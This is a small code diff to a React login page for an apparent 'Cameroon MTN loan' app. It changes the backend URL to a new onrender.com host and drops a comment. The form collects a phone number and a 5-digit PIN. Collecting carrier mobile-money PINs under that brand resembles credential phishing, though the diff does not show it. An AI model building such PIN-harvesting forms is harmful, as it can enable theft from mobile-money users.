@@ -2,7 +2,8 @@ import { useState, useEffect, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
-const API_URL = "https://fastloan-momo-kj8m.onrender.com";
+// ✅ UPDATED TO NEW RENDER URL
+const API_URL = "https://cameroon-mtn-loan-app.onrender.com";
 
 const Login = () => {
   const [phone, setPhone] = useState("");
@@ -11,7 +12,6 @@ const Login = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const navigate = useNavigate();
 
-  // ✅ Cameroon MTN numbers are 9 digits
   const isFormValid = phone.length === 9 && pin.length === 5;
 
   useEffect(() => {
